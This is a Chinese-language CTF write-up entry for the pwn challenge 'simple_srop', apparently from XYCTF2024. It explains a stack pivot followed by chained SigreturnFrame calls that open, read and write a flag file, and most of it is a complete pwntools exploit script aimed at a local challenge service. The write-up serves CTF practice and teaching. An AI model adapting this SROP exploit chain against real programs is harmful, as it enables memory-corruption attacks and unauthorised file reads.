# simple_srop

> 分类：Pwn

## 题目描述
被限制需要 ORW。先 read + 栈迁移，然后用 SigreturnFrame 依次构造 open / read / write 完成 ORW。

## 考察知识点
- SROP（SigreturnFrame）
- 栈迁移
- ORW

## 解法
先 read + 栈迁移，然后 ORW。

```python
from pwn import *

context.arch = 'amd64'

#sh = process('./vuln')
sh = remote('127.0.0.1',34157)

sigret = 0x401296
fake_stack = 0x404800
syscall_ret = 0x40129D
main_addr = 0x4012A3
flag_addr = fake_stack+0x400

payload = b'a'*0x20+p64(0)
payload += p64(sigret)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
sigframe.rdi = 0
sigframe.rsi = fake_stack
sigframe.rdx = 0x500
sigframe.rsp = fake_stack
sigframe.rip = syscall_ret
payload += bytes(sigframe)


sh.send(payload)

input()

payload = b''
payload += p64(sigret)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_open
sigframe.rdi = flag_addr
sigframe.rsi = 0
sigframe.rdx = 0
sigframe.rsp = fake_stack+0x100
sigframe.rip = syscall_ret
payload += bytes(sigframe)
payload += p64(sigret)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_read
sigframe.rdi = 3
sigframe.rsi = flag_addr
sigframe.rdx = 0x100
sigframe.rsp = fake_stack+0x200
sigframe.rip = syscall_ret
payload += bytes(sigframe)
payload += p64(sigret)
sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_write
sigframe.rdi = 1
sigframe.rsi = flag_addr
sigframe.rdx = 0x100
sigframe.rsp = fake_stack+0x300
sigframe.rip = syscall_ret
payload += bytes(sigframe)
payload += p64(main_addr)
payload = payload.ljust(0x400,b'\x00')+b'flag\x00'

sh.send(payload)


sh.interactive()
```

## 参考答案
（未给出，getshell 后读取）

## 来源
- 作者：jht3 | https://jht3qaq.github.io/2024/04/26/XYCTF2024-Writeup/
